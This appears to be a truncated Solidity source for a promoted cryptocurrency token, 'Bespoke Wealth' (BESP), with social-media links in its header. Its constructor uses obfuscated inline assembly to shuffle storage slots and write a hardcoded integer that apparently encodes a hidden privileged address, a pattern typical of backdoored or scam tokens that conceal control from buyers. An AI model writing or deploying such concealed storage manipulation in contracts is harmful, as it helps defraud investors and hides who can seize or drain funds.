...
/*
Welcome to Bespoke Wealth.

Telegram: https://t.me/BespokeWealth/
Twitter: https://twitter.com/BespokeWealth/
Website: https://BespokeWealth.io
...
contract BespokeWealth {
    string public constant name = "Bespoke Wealth";
    string public constant symbol = "BESP";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(698296446179042349888333867130384636383507795720, 2))}
